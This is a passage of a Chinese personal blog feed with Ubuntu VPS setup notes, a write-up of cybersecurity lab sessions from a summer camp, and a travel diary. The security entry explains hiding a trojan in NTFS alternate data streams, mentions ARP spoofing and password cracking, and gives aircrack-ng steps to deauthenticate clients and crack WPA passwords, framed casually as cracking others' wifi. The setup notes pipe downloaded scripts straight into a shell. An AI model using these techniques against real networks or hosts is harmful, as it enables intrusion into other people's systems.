href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//添加用户</span><br><span class="line"><span class="meta">$</span><span class="bash"> adduser username</span></span><br><span class="line">//将用户添加到 sudo 组</span><br><span class="line"><span class="meta">$</span><span class="bash"> adduser username sudo</span></span><br></pre></td></tr></table></figure><h2 id="修改-ssh-登录方式"><a href="#修改-ssh-登录方式" class="headerlink" title="修改 ssh 登录方式"></a>修改 ssh 登录方式</h2><h3 id="添加密钥到用户目录"><a href="#添加密钥到用户目录" class="headerlink" title="添加密钥到用户目录"></a>添加密钥到用户目录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> /home/username</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> mkdir .ssh/</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> touch .ssh/authorized_keys</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> vim .ssh/authorized_keys</span></span><br><span class="line">// 当前用户要加执行权限(x), 放私钥的话用700</span><br><span class="line"><span class="meta">$</span><span class="bash"> chmod 744 -R .ssh/</span></span><br><span class="line">// 修改文件用户及用户组</span><br><span class="line"><span class="meta">$</span><span class="bash"> chown -R username:username .ssh/</span></span><br></pre></td></tr></table></figure><h3 id="关闭密码登录"><a href="#关闭密码登录" class="headerlink" title="关闭密码登录"></a>关闭密码登录</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> vim /etc/ssh/sshd_config</span></span><br><span class="line">//修改为以下内容</span><br><span class="line">PermitRootLogin         prohibit-password</span><br><span class="line">AuthorizedKeysFile      .ssh/authorized_keys .ssh/authorized_keys2</span><br><span class="line">PasswordAuthentication  no</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//重启ssh服务</span><br><span class="line"><span class="meta">$</span><span class="bash"> systemctl restart sshd.service</span></span><br></pre></td></tr></table></figure><p>退出以 <code>username</code> 登录</p><h2 id="安装zsh-及-oh-my-zsh"><a href="#安装zsh-及-oh-my-zsh" class="headerlink" title="安装zsh 及 oh-my-zsh"></a>安装zsh 及 oh-my-zsh</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//apt 更新及安装 zsh</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt update</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt upgrade</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install zsh</span></span><br><span class="line">//更改当前用户终端shell</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo usermod -s /usr/bin/zsh $(whoami)</span></span><br></pre></td></tr></table></figure><p>重启终端<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//安装 git</span><br><span class="line"><span class="meta">$</span><span class="bash"> sudo apt install git</span></span><br><span class="line">//安装oh-my-zsh</span><br><span class="line"><span class="meta">$</span><span class="bash"> sh -c <span class="string">"<span class="variable">$(wget https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span></span><br><span class="line">//安装 zsh-syntax-highlighting 插件</span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span></span><br></pre></td></tr></table></figure></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//修改zsh配置文件</span><br><span class="line"><span class="meta">$</span><span class="bash"> vim .zshrc</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 自动命令矫正</span><br><span class="line">ENABLE_CORRECTION=&quot;true&quot;</span><br><span class="line"># 蛋白连接酶主题</span><br><span class="line">ZSH_THEME=&quot;bira&quot;</span><br><span class="line">plugins=(</span><br><span class="line">  git extract zsh-syntax-highlighting</span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//使配置生效</span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">source</span> ~/.zshrc</span></span><br></pre></td></tr></table></figure><p><img src="https://yes-images-1254021701.cos.ap-beijing.myqcloud.com/UTOOLS1577114993252.png" alt="UTOOLS1577114993252.png"></p><h2 id="开启BBR"><a href="#开启BBR" class="headerlink" title="开启BBR"></a>开启BBR</h2><p>首先查看一下系统内核版本：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> uname -r</span></span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4.15.0-50-generic</span><br></pre></td></tr></table></figure></p><p>该版本大于Linux4.9，所以可以直接开启BBR。<br>（这里要说明一下，有些云服务器商的定制系统即便内核大于4.9，在键入lsmod |grep bbr命令后并不会直接显示内置tcp_bbr模块，但实际是有的。）</p><p>下面输入如下命令，从而开启BBR功能：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"net.core.default_qdisc=fq"</span> &gt;&gt; /etc/sysctl.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"net.ipv4.tcp_congestion_control=bbr"</span> &gt;&gt; /etc/sysctl.conf</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> sysctl -p</span></span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net.core.default_qdisc = fq</span><br><span class="line">net.ipv4.tcp_congestion_control = bbr</span><br></pre></td></tr></table></figure></p><p>重启主机系统：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> reboot</span></span><br></pre></td></tr></table></figure></p><p>待系统重启完毕后，检查系统是否成功编译开启了tcp_bbr模块：<br>键入命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sysctl net.ipv4.tcp_available_congestion_control</span></span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> net.ipv4.tcp_available_congestion_control = reno cubic bbr</span></span><br></pre></td></tr></table></figure></p><p>键入命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sysctl net.ipv4.tcp_congestion_control</span></span><br></pre></td></tr></table></figure></p><p>输出<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net.ipv4.tcp_congestion_control = bbr</span><br></pre></td></tr></table></figure></p><p>键入命令：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> lsmod |grep bbr</span></span><br></pre></td></tr></table></figure></p><p>输出：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp_bbr 20480  2</span><br></pre></td></tr></table></figure></p><p>如果输出信息正确，则说明已成功开启了BBR功能。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;记录一下自己Ubuntu的基本配置，方便下次换VPS。emmm，在用docker前还是有必要的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;简单跑个分&quot;&gt;&lt;a href=&quot;#简单跑个分&quot; class=&quot;headerlink&quot; title=&quot;简单跑个分&quot;&gt;&lt;/a&gt;简单跑个分&lt;/h2&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; ssh root@server_address&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;// https://teddysun.com/444.html 测试脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;meta&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; wget -qO- bench.sh | bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="折腾笔记" scheme="https://yespace.xyz/categories/%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="操作系统" scheme="https://yespace.xyz/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
      <category term="VPS" scheme="https://yespace.xyz/tags/VPS/"/>
    
  </entry>
  
  <entry>
    <title>德国之行（二）——Cyber Security</title>
    <link href="https://yespace.xyz/2018/07/17/DUT-HPI-2/"/>
    <id>https://yespace.xyz/2018/07/17/DUT-HPI-2/</id>
    <published>2018-07-17T14:08:48.000Z</published>
    <updated>2019-12-30T10:09:41.326Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>10:08 pm 17.07.2018（GET+2）——DUT-HPI夏令营德国之行第九天；<br>在HPI听了几天关于网络安全的课程，虽然英语水平有限听得很勉强，但还是学到了一些有趣的东西，基本都是一些Hands-On的内容，这里简单做个笔记…<br><a id="more"></a></p></blockquote><h2 id="一、Find-“flag”"><a href="#一、Find-“flag”" class="headerlink" title="一、Find “flag”"></a>一、Find “flag”</h2><blockquote><p>主要接触到了三种情况</p></blockquote><h3 id="HTML内置flag"><a href="#HTML内置flag" class="headerlink" title="HTML内置flag"></a>HTML内置flag</h3><p>这种情况比较简单，在浏览器中查看网页源代码，寻找关键词就行，可能涉及到一些http的基础知识，这里不详细介绍了；</p><h3 id="NTFS隐藏文件"><a href="#NTFS隐藏文件" class="headerlink" title="NTFS隐藏文件"></a>NTFS隐藏文件</h3><p><strong>隐藏文件：</strong>在任一NTFS分区下打开CMD，输入:<code>echo abcde a.txt:b.txt</code>，则在当前目录下会生成一个名为<code>a.txt</code>的文件，但文件的大小为0字节，打开后也无任何内容，只有输入命令：<code>notepad a.txt:b.txt</code>才能看见写入的<code>abcde</code>，也可以使用<code>type</code>命令进行隐藏，比如：<code>type 1.jpg 2.abc:1.jpg</code>，表示将<code>1.jpg</code>的内容写入到<code>2.abc:1.jpg</code>这个流文件中。<br><strong>隐藏木马：</strong>与隐藏文件同理，<code>type muma.exe2.jpg:muma.exe</code>，将<code>muma.exe</code>写入到<code>2.jpg:muma.exe</code>这个流文件中，打开的时候则：<code>start</code>流文件绝对路径，上例是：<code>start c:/2.jpg:muma.exe</code>；不然会提示参数不正确。</p><p><strong>Note:</strong></p><ul><li>流文件不能直接通过网络传输，必须使用<code>WinRAR</code>在压缩时勾上高级选项中“保存文件流数据”才行；</li><li>制作好的流文件大小跟原文件是一样的，只在压缩后才包含隐藏文件的大小，说明<code>NTFS</code>文件流仍然会占用磁盘空间；</li><li>流文件只能在<code>NTFS</code>分区储存和运行(压缩“保存文件流数据”也可储存到<code>FAT32</code>，但解压出来的文件依然是丢失了数据流的文件)，一旦放到其它的文件系统中，即使再放回来，<code>NTFS</code>数据流也会丢失，Hands on的时候就遇到了解压文件后看不到隐藏文件的情况，重新解压覆盖才行（具体原因不解）；</li></ul><h3 id="简单文本加密"><a href="#简单文本加密" class="headerlink" title="简单文本加密"></a>简单文本加密</h3><blockquote><p>几种常见的加密方式</p></blockquote><h4 id="Base64"><a href="#Base64" class="headerlink" title="Base64"></a>Base64</h4><p><code>Base64</code>是一种基于64个可打印字符来表示二进制数据的表示方法。由于<code>2^6=64</code>，所以每6个比特为一个单元，对应某个可打印字符。3个字节有24个比特，对应于4个<code>Base64</code>单元，即3个字节可由4个可打印字符来表示。<br><strong>算法简述：</strong>转换的时候，将3字节的数据，先后放入一个24位的缓冲区中，先来的字节占高位。数据不足3字节的话，于缓冲器中剩下的比特用0补足。每次取出6比特（因为 <code>2^6 = 64</code>），按照其值选择<code>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/</code>中的字符作为编码后的输出，直到全部输入数据转换完成。若原数据长度不是3的倍数时且剩下1个输入数据，则在编码结果后加2个=；若剩下2个输入数据，则在编码结果后加1个=。</p><h4 id="Rot13"><a href="#Rot13" class="headerlink" title="Rot13"></a>Rot13</h4><p>套用<code>ROT13</code>到一段文字上仅仅只需要检查字符字母顺序并取代它在13位之后的对应字母，有需要超过时则重新绕回26英文字母开头即可。 A换成N、B换成O、依此类推到M换成Z，然后序列反转：N换成A、O换成B、最后Z换成M。只有这些出现在英文字母里头的字符受影响；数字、符号、空白字符以及所有其他字符都不变。因为只有在英文字母表里头只有26个，并且<code>26 = 2 × 13</code>，<code>ROT13</code>函数是它自己的逆反。</p><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><p><strong>算法简述：</strong><code>MD5</code>以<code>512</code>位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成一个<code>128</code>位散列值。<br><strong>特点：</strong>理论上是单向加密，不可逆。<strong>但是</strong>，1996年后被证实存在弱点，可以被加以破解，对于需要高度安全性的数据，一般建议改用其他算法，如<code>SHA-2</code>。2004年，证实<code>MD5</code>算法无法防止碰撞，因此不适用于安全性认证，如<code>SSL公开密钥认证</code>或是<code>数字签名</code>等用途。现在软件也有很多<code>MD5</code>的破解工具，基本原理都是暴力的字典遍历，如果密文比较简单，很快就能碰撞出来。</p><blockquote><p>虽然上述的文本加密方式都比较简单，但实际上再复杂的加密方式都保护不了像<code>“123456”</code>这样的文本！:joy:</p></blockquote><h2 id="二、网络嗅探"><a href="#二、网络嗅探" class="headerlink" title="二、网络嗅探"></a>二、网络嗅探</h2><h3 id="Shodan"><a href="#Shodan" class="headerlink" title="Shodan"></a>Shodan</h3><p><a href="https://www.shodan.io/" target="_blank" rel="noopener">Shodan.io</a>是互联网上“最可怕的搜索引擎”，与谷歌不同的是，<code>Shodan</code>不是在网上搜索网址，而是直接进入互联网的背后通道。<code>Shodan</code>可以说是一款“黑暗”谷歌，一刻不停的在寻找着所有和互联网关联的服务器、摄像头、打印机、路由器等等。每个月<code>Shodan</code>都会在大约5亿个服务器上日夜不停地搜集信息。比如：此网站<a href="https://www.shodan.io/search?query=yespace.xyz" target="_blank" rel="noopener">Yespace</a>就被记录在了<code>Shodan</code>的数据库中:disappointed_relieved:，<code>Shodan</code>可以利用简单的语法进行搜索，比如：搜索<code>“大连理工大学范围内的主机”</code>可以搜索<a href="https://www.shodan.io/search?query=org%3A%22Dalian+University+of+Technology%22" target="_blank" rel="noopener">org:”Dalian University of Technology”</a>，常用关键词见下表：</p><table><thead><tr><th>关键词</th><th>作用</th></tr></thead><tbody><tr><td>hostname</td><td>搜索指定的主机或域名，例如 hostname:"google"</td></tr><tr><td>port</td><td>搜索指定的端口或服务，例如 port:"80"</td></tr><tr><td>country</td><td>搜索指定的国家，例如 country:"CN"</td></tr><tr><td>city</td><td>搜索指定的城市，例如 city:"Dalian"</td></tr><tr><td>org</td><td>搜索指定的组织或公司，例如 org:"google"</td></tr><tr><td>isp</td><td>搜索指定的ISP供应商，例如 isp:"China Telecom"</td></tr><tr><td>product</td><td>搜索指定的操作系统/软件/平台，例如 product:"Apache httpd"</td></tr><tr><td>version</td><td>搜索指定的软件版本，例如 version:"1.6.2"</td></tr><tr><td>geo</td><td>搜索指定的地理位置，例如 geo:"31.8639, 117.2808"</td></tr><tr><td>before/after</td><td>搜索指定收录时间前后的数据，格式为dd-mm-yy，例如 before:”18-07-18”</td></tr><tr><td>net</td><td>搜索指定的IP地址或子网，例如 net:"210.45.240.0/24"</td></tr></tbody></table><blockquote><p><strong>#补充#：</strong>Shodan的具(ru)体(keng)介(zhi)绍(nan)可以参考一下这篇文章<a href="https://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan/" target="_blank" rel="noopener">https://xiaix.me/shodan-xin-shou-ru-keng-zhi-nan</a></p></blockquote><p>—————分割线—————-</p><blockquote><p>10:38 pm 20.07.2018（GET+2）——DUT-HPI夏令营德国之行第十二天，继续更；</p></blockquote><p>如果说上面使用的<code>Shodan</code>搜索是利用别人爬取好的数据来获取信息，那下面的几种方式就是自己利用一些工具来进行网络嗅探</p><h3 id="DNS信息查询"><a href="#DNS信息查询" class="headerlink" title="DNS信息查询"></a>DNS信息查询</h3><p>DNS（Domain Name System）常用的大概有6种解析记录类型：</p><div align="center">|名称|解释||:---:|:---:||A记录|记录域名对应的IPV4地址||AAAA记录|记录域名对应的IPV6地址||MX记录|记录域名对应的邮件服务地址||NS记录|记录由哪个DNS服务器解析你的域名||CNAME记录|别名解析，可以将不同域名都解析到一个域名上||TXT记录|记录一些主机或域名情况的说明|</div><p><strong>Nslookup</strong><br><code>nslookup</code>是用来监测网络中<code>DNS</code>服务器是否可以实现域名解析的工具，简单来说可以获取域名对应的<code>ip</code>。与<code>ping</code>的区别在于，<code>nslookup</code>返回的结果更丰富，而且主要针对<code>DNS</code>服务器的排错，收集<code>DNS</code>服务器的信息。（其实<code>ping</code>的过程也去请求了<code>dns</code>的记录，然后对<code>ip</code>发送<code>ICMP</code>数据包）</p><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/nslookup_test.png" alt></p><p><code>nslookup</code>在<code>Linux shell</code>中的交互式使用（当然使用不同的参数可以查询不同的记录类型）&lt;/p&gt;</p><h3 id="Nmap端口扫描"><a href="#Nmap端口扫描" class="headerlink" title="Nmap端口扫描"></a>Nmap端口扫描</h3><p><code>Nmap</code>是一款非常强大的端口扫面工具，可以检测目标主机是否在线、端口开放情况、侦测运行的服务类型及版本信息、侦测操作系统与设备类型等信息。具体使用方式可以查看<a href="https://nmap.org/man/zh/index.html" target="_blank" rel="noopener">Nmap参考指南</a>，下面列一些常用的轻量级端口扫描命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ nmap -sP 192.168.1.0/24     //判断哪些主机存活</span><br><span class="line">$ nmap -sT 192.168.1.3        //开放了哪些端口</span><br><span class="line">$ nmap -sS 192.168.1.127      //开放了哪些端口（隐蔽扫描）</span><br><span class="line">$ nmap -sU 192.168.1.127      //开放了哪些端口（UDP）</span><br><span class="line">$ nmap -sS -O  192.168.1.127  //操作系统识别</span><br><span class="line">$ nmap -sT -p 80 -oG – 192.168.1.* | grep open        //列出开放了指定端口的主机列表</span><br><span class="line">$ nmap -sV -p 80 yespace.xyz      //列出服务器类型(列出操作系统，开发端口，服务器类型,网站脚本类型等)</span><br></pre></td></tr></table></figure><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/nmap_test.png" alt></p><h3 id="APR攻击-Man-In-The-Middle系列"><a href="#APR攻击-Man-In-The-Middle系列" class="headerlink" title="APR攻击(Man-In-The-Middle系列)"></a>APR攻击(Man-In-The-Middle系列)</h3><p>这一部分的内容当时只是观看了演示，其基本原理就是使用<code>Arpspoof</code>工具在客户端和服务端之间的<code>Internet Layer</code>上建立第三方代理<code>MITM(Man-In-The-Middle)</code>，从而实现对网络数据流的监控。在<code>kali</code>中的实现可以参考<a href="https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html" target="_blank" rel="noopener">这篇文章</a>，实际上当时的演示实验就是这个步骤。</p><h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><p>基本过程就是使用<code>John the Ripper</code>工具对<code>Hash</code>后的密文进行crack，<code>John</code>包含了四种破解模式，具体说明可以参考官方文档<a href="http://www.openwall.com/john/doc/MODES.shtml" target="_blank" rel="noopener">模式说明</a>，这里简单提一下用到的两种基本模式：</p><ul><li><strong>字典模式：</strong>就是使用现有的“经验字典”来进行碰撞，只要字典足够强大…（你懂的，“强大”这种东西永远没有确切定义，反正能破解出来就是好使→_→）；然后，<code>/usr/share/wordlists/</code>这个目录下包含了<code>kali</code>中的一些内置字典，对于基本的密码破解已经足够了。</li><li><strong>增量模式：</strong>属于<code>John</code>的一种高级用法，属于暴力破解范畴，这个破解模式会尝试所有的字符组合，然后作为密码来破解，当然时间是相当久的；其命令关键词是<code>--incremental</code>。</li></ul><h2 id="三、Web攻击"><a href="#三、Web攻击" class="headerlink" title="三、Web攻击"></a>三、Web攻击</h2><h3 id="ZAP基本使用"><a href="#ZAP基本使用" class="headerlink" title="ZAP基本使用"></a>ZAP基本使用</h3><p><a href="https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project" target="_blank" rel="noopener">OWASP ZAP</a>是一个易于使用交互式的用于<code>web漏洞挖掘</code>的渗透测试工具，在Hands-On中我们主要使用了它的截断代理功能。基本实现步骤如下：</p><ul><li>首先，设置浏览器代理，<code>ZAP</code>默认监听的是本地的<code>8080</code>端口（即：<code>127.0.0.1:8080</code>），在浏览器中设置http代理后<code>ZAP</code>就自动爬取所有数据，具体方法这里就不赘述了。</li><li>设置代理后<code>ZAP</code>就可以自动获取该端口上的所有数据并显示，也可以通过设置中断，来修改提交的数据（当然<code>ZAP</code>是建立在<code>Application-Layer</code>上的，所以如果拦截使用<code>SSL</code>加密后的数据就没有什么意义了…）。</li><li>当然，<code>ZAP</code>最强大的还是在于它的主动扫描功能了，它可以自动对目标网站发起渗透测试，可以检测的缺陷包括路径遍历、文件包含、跨站脚本、sql注入等等。</li></ul><h3 id="Web-Goat实战"><a href="#Web-Goat实战" class="headerlink" title="Web-Goat实战"></a>Web-Goat实战</h3><p><code>WebGoat</code>是一个渗透破解的习题教程,分为简单版和开发版,<a href="https://github.com/WebGoat/WebGoat" target="_blank" rel="noopener">GitHub地址</a>，下载后自行安装即可，<a href="http://www.vuln.cn/6544" target="_blank" rel="noopener">这里</a>有一篇比较好的文章可以参考一下，从Project安装到部分实战都有涉及，这个我就不bb了</p><h2 id="四、网络攻防"><a href="#四、网络攻防" class="headerlink" title="四、网络攻防"></a>四、网络攻防</h2><h3 id="Aircrack-ng破解无线网络"><a href="#Aircrack-ng破解无线网络" class="headerlink" title="Aircrack-ng破解无线网络"></a>Aircrack-ng破解无线网络</h3><p>这个我认为是所有Hands-On中最有实用价值的环节了，没事破解一下别人的<code>wifi</code>密码还挺有意思的:smile:，不过如果你是在虚拟机中跑<code>Kali</code>的话首先你需要一块无线网卡作为硬件支持，使用本机的物理网卡的话驱动不一定支持…<br>下面是破解WiFi密码的一些基本命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//杀死可能干扰的进程</span><br><span class="line">$ airmon-ng check <span class="built_in">kill</span></span><br><span class="line"></span><br><span class="line">//以monitor模式开启无线网卡</span><br><span class="line">$ ifconfig wlan0 down</span><br><span class="line">$ iwconfig wlan0 mode monitor</span><br><span class="line">$ ifconfig wlan0 up</span><br><span class="line"></span><br><span class="line">//搜索附近的无线网络</span><br><span class="line">airodump-ng wlan0</span><br></pre></td></tr></table></figure><p>这里需要记录一下你想要破解的目标的<code>CLIENT_BSSID</code>和<code>WIFI_CHANNEL</code>，后续需要使用。然后就是抓包环节了，由于只有在设备和路由建立连接的握手包中才会包含<code>wifi</code>密码的哈希值，所以下面抓包的主要目的就是要抓这个握手包。如果在抓包的过程中没有设备连接的话，是抓不到握手包的，这时就要手动制造连接，由于但是一般设备在断开连接后都会有自动连接，所以可以先把其中一个设备踢出去，让它再次连接，这样我们就可以抓住这个<code>shake</code>包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//开始抓包，注意替换一些变量</span><br><span class="line">$ airodump-ng wlan0 --channel WIFI_CHANNEL --bssid ROUTER_BSSID -w TEST_FILE--ignore-negative-one</span><br><span class="line"></span><br><span class="line">//同时将某个客户端踢出</span><br><span class="line">$ aireplay-ng --deauth 100 -a ROUTER_BSSID -c CLIENT_BSSID --ignore-negative-one wlan0</span><br><span class="line"></span><br><span class="line">//利用字典，暴力crack密码</span><br><span class="line">$ aircrack-ng -w passwords.lst -b ROUTER_BSSID TEST_FILE.cap&lt;/pre&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;10:08 pm 17.07.2018（GET+2）——DUT-HPI夏令营德国之行第九天；&lt;br&gt;在HPI听了几天关于网络安全的课程，虽然英语水平有限听得很勉强，但还是学到了一些有趣的东西，基本都是一些Hands-On的内容，这里简单做个笔记…&lt;br&gt;
    
    </summary>
    
      <category term="计算机" scheme="https://yespace.xyz/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
    
      <category term="德国" scheme="https://yespace.xyz/tags/%E5%BE%B7%E5%9B%BD/"/>
    
      <category term="网络" scheme="https://yespace.xyz/tags/%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>德国之行（一）——About Life</title>
    <link href="https://yespace.xyz/2018/07/13/DUT-HPI-1/"/>
    <id>https://yespace.xyz/2018/07/13/DUT-HPI-1/</id>
    <published>2018-07-13T14:08:48.000Z</published>
    <updated>2019-12-25T09:14:38.656Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>9:07 pm 13.07.2018（GET+2）——DUT-HPI夏令营德国之行第四天；<br>倒过时差后人也比较清醒了，毕竟是第一次跨过The Great Wall，闲来无聊记点东西吧…</p></blockquote><p>经过好一翻折腾，到达了<strong>Potsdam</strong>（准确地说是柏林与勃兰登堡洲的交界）。环境没什么好说的，现代化老牌发达国家的气质<br><a id="more"></a></p><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/IMG_0793.jpg" width="80%" alt="图片名称" align="center"></p><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/IMG_0801.jpg" width="80%" alt="图片名称" align="center"></p><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/IMG_0809.jpg" width="80%" alt="图片名称" align="center"></p><p style="text-align: center;">（随手拍 + 未处理组图）</p><blockquote><p>唯一吐槽的是，夏令时北纬50°这白天也太长了吧!</p></blockquote><p><img src="https://yespace-1254021701.cos.ap-beijing.myqcloud.com/images/IMG_0807.jpg" width="80%" alt="图片名称" align="center"></p><p style="text-align: center;">（摄于德国时间21:41/09.07.2018）</p><hr><h4 id="关于体验"><a href="#关于体验" class="headerlink" 